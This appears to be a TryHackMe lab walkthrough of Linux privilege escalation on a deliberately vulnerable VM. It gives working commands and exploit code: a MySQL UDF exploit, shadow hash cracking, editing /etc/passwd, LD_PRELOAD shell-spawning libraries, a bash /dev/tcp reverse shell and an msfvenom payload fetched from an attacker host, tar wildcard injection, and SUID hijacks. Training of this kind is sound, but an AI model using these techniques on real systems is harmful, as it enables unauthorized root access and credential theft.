---
title: "TryHackMe - Linux PrivEsc"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - linux privesc
---
Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root! SSH is available. Credentials: user:password321

## Deploy the Vulnerable Debian VM
- Deploy the machine and login to the "user" account using SSH.

    ```bash
    ssh user@10.10.240.248

    Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
    user@debian:~$
    ```

#### Run the "id" command. What is the result?

```bash
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

## Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Step by step:
- Change into the `/home/user/tools/mysql-udf` directory

    ```bash
    user@debian:~$ cd /home/user/tools/mysql-udf
    ```

- Compile the `raptor_udf2.c` exploit code using the following commands:

    ```bash
    user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
    user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    ```

- Connect to the MySQL service as the root user with a blank password:

    ```bash
    user@debian:~/tools/mysql-udf$ mysql -u root
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 35
    Server version: 5.1.73-1+deb6u1 (Debian)

    Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    mysql>
    ```

- Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

    ```bash
    mysql> use mysql;
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Database changed
    mysql> create table foo(line blob);
    Query OK, 0 rows affected (0.01 sec)

    mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
    Query OK, 1 row affected (0.00 sec)

    mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
    Query OK, 1 row affected (0.00 sec)

    mysql> create function do_system returns integer soname 'raptor_udf2.so';
    Query OK, 0 rows affected (0.00 sec)
    ```

- Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

    ```bash
    mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    +------------------------------------------------------------------+
    | do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
    +------------------------------------------------------------------+
    |                                                                0 |
    +------------------------------------------------------------------+
    1 row in set (0.01 sec)
    ```

- Exit out of the MySQL shell (type `exit` or `\q` and press Enter) and run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

    ```bash
    mysql> exit
    Bye
    user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
    rootbash-4.1#
    ```

- Remember to remove the `/tmp/rootbash` executable and exit out of the root shell before continuing as you will create this file again later in the room!

    ```bash
    rootbash-4.1# rm /tmp/rootbash
    rootbash-4.1# exit
    exit
    ```

## Weak File Permissions - Readable /etc/shadow
The `/etc/shadow` file contains user password hashes and is usually readable only by the root user.

- Note that the /etc/shadow file on the VM is world-readable:

    ```bash
    user@debian:~$ ls -l /etc/shadow
    -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
    ```

- View the contents of the /etc/shadow file:

    ```bash
    user@debian:~$ cat /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
    daemon:*:17298:0:99999:7:::
    bin:*:17298:0:99999:7:::
    sys:*:17298:0:99999:7:::
    sync:*:17298:0:99999:7:::
    games:*:17298:0:99999:7:::
    man:*:17298:0:99999:7:::
    lp:*:17298:0:99999:7:::
    mail:*:17298:0:99999:7:::
    news:*:17298:0:99999:7:::
    uucp:*:17298:0:99999:7:::
    proxy:*:17298:0:99999:7:::
    www-data:*:17298:0:99999:7:::
    backup:*:17298:0:99999:7:::
    list:*:17298:0:99999:7:::
    irc:*:17298:0:99999:7:::
    gnats:*:17298:0:99999:7:::
    nobody:*:17298:0:99999:7:::
    libuuid:!:17298:0:99999:7:::
    Debian-exim:!:17298:0:99999:7:::
    sshd:*:17298:0:99999:7:::
    user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
    statd:*:17299:0:99999:7:::
    mysql:!:18133:0:99999:7:::
    ```

    Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

- Save the root user's hash to a file called `hash.txt`. Run the command using sudo depending on your version of Kali:

    ```bash
    $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt      
    Using default input encoding: UTF-8
    Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    password123      (    root)
    password321      (    user)
    2g 0:00:00:23 DONE (2021-01-15 08:07) 0.08499g/s 2627p/s 2692c/s 2692C/s simone13..makenzi
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```

- Switch to the root user, using the cracked password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

#### What is the root user's password hash?
> It's `root:$6$Tb/euwmK$OXA.dwMeOAc opwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv RDJXET..it8r.jbrlpfZeMdwD3B0fGxJ 0:17298:0:99999:7:::`

#### What hashing algorithm was used to produce the root user's password hash?
> It's usually `sha512crypt`.

#### What is the root user's password?
> password123

## Weak File Permissions - Writable /etc/shadow
The `/etc/shadow` file contains user password hashes and is usually readable only by the root user.

- Note that the /etc/shadow file on the VM is world-readable:

    ```bash
    user@debian:~$ ls -l /etc/shadow
    -rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
    ```

- Generate a new password hash with a password of your choice:

    ```bash
    user@debian:~$ mkpasswd -m sha-512 test
    $6$eoUp.j6kTQr$tG3BYYfW7dkxUDaYIMHWiFrVHc9KsMS2P8RUko7YKY31m6QDOQfWRLLOUnFuD1mHV2W5OIBCgqNyox9Mp7t9F0
    ```

- Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

    ```bash
    user@debian:~$ nano /etc/shadow
    ```

- Switch to the root user, using the new password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

## Weak File Permissions - Writable /etc/passwd
The `/etc/passwd` file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the `/etc/passwd` file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

- Note that the /etc/passwd file on the VM is world-readable:

    ```bash
    user@debian:~$ ls -l /etc/passwd
    -rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
    ```

- Generate a new password hash with a password of your choice:

    ```bash
    user@debian:~$ openssl passwd test
    CLKSOkgdxXRsg
    ```

- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

    ```bash
    user@debian:~$ nano /etc/passwd
    ```

- Switch to the root user, using the new password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

    ```bash
    user@debian:~$ cat /etc/passwd
    root:CLKSOkgdxXRsg:0:0:root:/root:/bin/bash
    newroot:CLKSOkgdxXRsg:0:0:root:/root:/bin/bash
    ```

- Now switch to the newroot user, using the new password:

    ```bash
    user@debian:~$ su newroot
    Password: 
    root@debian:/home/user# 
    ```

#### Run the "id" command as the newroot user. What is the result?

```bash
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```

## Sudo - Shell Escape Sequences
List the programs which sudo allows your user to run:

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

#### How many programs is "user" allowed to run via sudo? 
> 11, as we run `sudo -l` before.

#### One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
> `/usr/sbin/apache2`

## Sudo - Environment Variables
Sudo can be configured to inherit certain environment variables from the user's environment.

- Check which environment variables are inherited (look for the env_keep options):

    ```bash
    user@debian:~$ sudo -l
    Matching Defaults entries for user on this host:
        env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

    User user may run the following commands on this host:
        (root) NOPASSWD: /usr/sbin/iftop
        (root) NOPASSWD: /usr/bin/find
        (root) NOPASSWD: /usr/bin/nano
        (root) NOPASSWD: /usr/bin/vim
        (root) NOPASSWD: /usr/bin/man
        (root) NOPASSWD: /usr/bin/awk
        (root) NOPASSWD: /usr/bin/less
        (root) NOPASSWD: /usr/bin/ftp
        (root) NOPASSWD: /usr/bin/nmap
        (root) NOPASSWD: /usr/sbin/apache2
        (root) NOPASSWD: /bin/more
    ```

    LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

- Create a shared object using the code located at `/home/user/tools/sudo/preload.c`:
    
    - Source code:

        ```c
        user@debian:~$ cat /home/user/tools/sudo/preload.c
        #include <stdio.h>
        #include <sys/types.h>
        #include <stdlib.h>

        void _init() {
                unsetenv("LD_PRELOAD");
                setresuid(0,0,0);
                system("/bin/bash -p");
        }
        ```

    - Compile.

        ```bash
        user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
        ```

- Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

    ```bash
    user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so find
    root@debian:/home/user#
    ```

- A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

    ```bash
    root@debian:/home/user# exit
    exit
    .
    ./.mysql_history
    ./.nano_history
    ./tools
    ./tools/suid
    ./tools/suid/libcalc.c
    ./tools/suid/service.c
    ./tools/suid/exim
    ./tools/suid/exim/cve-2016-1531.sh
    ./tools/privesc-scripts
    ./tools/privesc-scripts/linpeas.sh
    ./tools/privesc-scripts/lse.sh
    ./tools/privesc-scripts/LinEnum.sh
    ./tools/nginx
    ./tools/nginx/nginxed-root.sh
    ./tools/sudo
    ./tools/sudo/library_path.c
    ./tools/sudo/preload.c
    ./tools/mysql-udf
    ./tools/mysql-udf/raptor_udf2.o
    ./tools/mysql-udf/raptor_udf2.c
    ./tools/mysql-udf/raptor_udf2.so
    ./tools/kernel-exploits
    ./tools/kernel-exploits/dirtycow
    ./tools/kernel-exploits/dirtycow/c0w.c
    ./tools/kernel-exploits/linux-exploit-suggester-2
    ./tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
    ./tools/kernel-exploits/linux-exploit-suggester-2/README.md
    ./tools/kernel-exploits/linux-exploit-suggester-2/LICENSE
    ./.john
    ./.irssi
    ./.irssi/config
    ./.bashrc
    ./.lesshst
    ./.profile
    ./.viminfo
    ./.bash_logout
    ./myvpn.ovpn
    ./.bash_history
    ```

- Run ldd against the apache2 program file to see which shared libraries are used by the program:

    ```bash
    user@debian:~$ ldd /usr/sbin/apache2
            linux-vdso.so.1 =>  (0x00007fffb9fff000)
            libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f7e4e3c9000)
            libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f7e4e1a5000)
            libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f7e4df6b000)
            libpthread.so.0 => /lib/libpthread.so.0 (0x00007f7e4dd4f000)
            libc.so.6 => /lib/libc.so.6 (0x00007f7e4d9e3000)
            libuuid.so.1 => /lib/libuuid.so.1 (0x00007f7e4d7de000)
            librt.so.1 => /lib/librt.so.1 (0x00007f7e4d5d6000)
            libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7e4d39f000)
            libdl.so.2 => /lib/libdl.so.2 (0x00007f7e4d19a000)
            libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7e4cf72000)
            /lib64/ld-linux-x86-64.so.2 (0x00007f7e4e886000)
    ```

- Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at `/home/user/tools/sudo/library_path.c`:

    ```bash
    user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    ```

- Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

    ```bash
    user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
    apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
    root@debian:/home/user# 
    ```

- A root shell should spawn. Exit out of the shell. Try renaming `/tmp/libcrypt.so.1` to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the `library_path.c` code could be changed to make it work.

    ```bash
    user@debian:~$ gcc -o /tmp/libapr-1.so.0 -shared -fPIC /home/user/tools/sudo/library_path.c
    user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
    apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
    apache2: symbol lookup error: /usr/lib/libaprutil-1.so.0: undefined symbol: apr_pool_cleanup_null
    ```

## Cron Jobs - File Permissions
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.

- View the contents of the system-wide crontab:

    ```bash
    user@debian:~$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh
    ```

    There should be two cron jobs scheduled to run every minute. One runs `overwrite.sh`, the other runs `/usr/local/bin/compress.sh`.

- Locate the full path of the overwrite.sh file:
    
    ```bash
    user@debian:~$ locate overwrite.sh
    locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 245.2 days)
    /usr/local/bin/overwrite.sh
    ```

- Note that the file is world-writable:

    ```bash
    user@debian:~$ ls -l /usr/local/bin/overwrite.sh
    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
    ```

- Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

    ```
    #!/bin/bash
    bash -i >& /dev/tcp/10.11.25.205/9999 0>&1
    ```

- Set up a netcat listener on your Kali box on port 9999 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

    ```bash
    $ nc -lnvp 9999
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.240.248] 48535
    bash: no job control in this shell
    root@debian:~#
    ```

## Cron Jobs - PATH Environment Variable
View the contents of the system-wide crontab:

- View the contents of the system-wide crontab:

    ```bash
    user@debian:~$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    * * * * * root overwrite.sh
    * * * * * root /usr/local/bin/compress.sh
    ```
    
    Note that the PATH variable starts with /home/user which is our user's home directory.

- Create a file called overwrite.sh in your home directory with the following contents:

    ```bash
    #!/bin/bash

    cp /bin/bash /tmp/rootbash
    chmod +xs /tmp/rootbash
    ```

- Make sure that the file is executable:

    ```bash
    user@debian:~$ chmod +x /home/user/overwrite.sh
    ```

- Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:

    ```bash
    user@debian:~$ /tmp/rootbash -p
    rootbash-4.1# 
    ```

#### What is the value of the PATH variable in /etc/crontab?
> `/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

## Cron Jobs - Wildcards
- View the contents of the other cron job script:

    ```bash
    user@debian:~$ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *
    ```

    Note that the tar command is being run with a wildcard (*) in your home directory. Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

    ```bash
    $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.25.205 LPORT=9999 -f elf -o shell.elf
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 74 bytes
    Final size of elf file: 194 bytes
    Saved as: shell.elf
    ```

- Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

    ```bash
    user@debian:~$ wget http://10.11.25.205:8080/shell.elf
    --2021-01-15 09:33:37--  http://10.11.25.205:8080/shell.elf
    Connecting to 10.11.25.205:8080... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 194 [application/octet-stream]
    Saving to: “shell.elf”

    100%[====================================================================>] 194         --.-K/s   in 0s      

    2021-01-15 09:33:37 (42.8 MB/s) - “shell.elf” saved [194/194]

    user@debian:~$ chmod +x /home/user/shell.elf
    ```

- Create these two files in /home/user:

    ```bash
    user@debian:~$ touch /home/user/--checkpoint=1
    user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
    ```

    When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

- Set up a netcat listener on your Kali box on port 9999 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

    ```bash
    $ nc -lnvp 9999
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.240.248] 48588
    whoami
    root
    ```

## SUID / SGID Executables - Known Exploits
- Find all the SUID/SGID executables on the Debian VM:

    ```bash
    user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
    ```

    Note that `/usr/sbin/exim-4.84-3` appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

    A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at `/home/user/tools/suid/exim/cve-2016-1531.sh`.

- Run the exploit script to gain a root shell:

    ```bash
    user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
    [ CVE-2016-1531 local root exploit
    sh-4.1# 
    ```

## SUID / SGID Executables - Shared Object Injection
The `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection.

- First, execute the file and note that currently it displays a progress bar before exiting:

    ```bash
    user@debian:~$ /usr/local/bin/suid-so
    Calculating something, please wait...
    [=====================================================================>] 99 %
    Done.
    ```

- Run `strace` on the file and search the output for open/access calls and for "no such file" errors:

    ```bash
    user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libdl.so.2", O_RDONLY)       = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libm.so.6", O_RDONLY)        = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libc.so.6", O_RDONLY)        = 3
    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
    ```

    Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within our home directory, but it cannot be found.

- Create the .config directory for the libcalc.so file:

    ```bash
    user@debian:~$ mkdir /home/user/.config
    ```

- Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

    - libcalc.c:

        ```c
        user@debian:~$ cat /home/user/tools/suid/libcalc.c
        #include <stdio.h>
        #include <stdlib.h>

        static void inject() __attribute__((constructor));

        void inject() {
                setuid(0);
                system("/bin/bash -p");
        }
        ```

    - Compiling.

        ```bash
        user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
        ```

- Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

    ```bash
    user@debian:~$ /usr/local/bin/suid-so
    Calculating something, please wait...
    bash-4.1# 
    ```

## SUID / SGID Executables - Environment Variables
The **/usr/local/bin/suid-env** executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

- First, execute the file and note that it seems to be trying to start the apache2 webserver:

    ```bash
    user@debian:~$ /usr/local/bin/suid-env
    [....] Starting web server: apache2httpd (pid 1719) already running
    . ok
    ```

- Run strings on the file to look for strings of printable characters:

    ```bash
    user@debian:~$ strings /usr/local/bin/suid-env
    /lib64/ld-linux-x86-64.so.2
    5q;Xq
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    service apache2 start
    ```

    One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

- Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

    ```bash
    user@debian:~$ gcc -o service /home/user/tools/suid/service.c
    ```

- Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

    ```bash
    user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
    root@debian:~#
    ```

## SUID / SGID Executables - Abusing Shell Features (#1)
The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

- Verify this with strings:

    ```
    bash
    user@debian:~$ strings /usr/local/bin/suid-env2
    /lib64/ld-linux-x86-64.so.2
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    /usr/sbin/service apache2 start
    ```

    In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

- Verify the version of Bash installed on the Debian VM is less than 4.2-048:

    ```bash
    user@debian:~$ /bin/bash --version
    GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
    Copyright (C) 2009 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

    This is free software; you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    ```

- Create a Bash function with the name "`/usr/sbin/service`" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

    ```bash
    user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
    user@debian:~$ export -f /usr/sbin/service
    ```

- Run the suid-env2 executable to gain a root shell:

    ```bash
    user@debian:~$ /usr/local/bin/suid-env2
    root@debian:~#
    ```

## Passwords & Keys - History Files
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

- View the contents of all the hidden history files in the user's home directory:

    ```bash
    user@debian:~$ cat ~/.*history | less
    ls -al
    cat .bash_history 
    ls -al
    mysql -h somehost.local -uroot -ppassword123
    exit
    cd /tmp
    clear
    ifconfig
    netstat -antp
    nano myvpn.ovpn 
    ls
    identify
    ```

    Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

- Switch to the root user, using the password:

    ```bash
    user@debian:~$ su root
    Password: 
    root@debian:/home/user#
    ```

- What is the full mysql command the user executed?

    ```bash
    mysql -h somehost.local -uroot -ppassword123
    ```

## Passwords & Keys - Config Files
Config files often contain passwords in plaintext or other reversible formats.

- List the contents of the user's home directory:

    ```bash
    user@debian:~$ ls /home/user
    myvpn.ovpn  tools
    ```

- Note the presence of a myvpn.ovpn config file. View the contents of the file:

    ```bash
    user@debian:~$ cat /home/user/myvpn.ovpn
    client
    dev tun
    proto udp
    remote 10.10.10.10 1194
    resolv-retry infinite
    nobind
    persist-key
    persist-tun
    ca ca.crt
    tls-client
    remote-cert-tls server
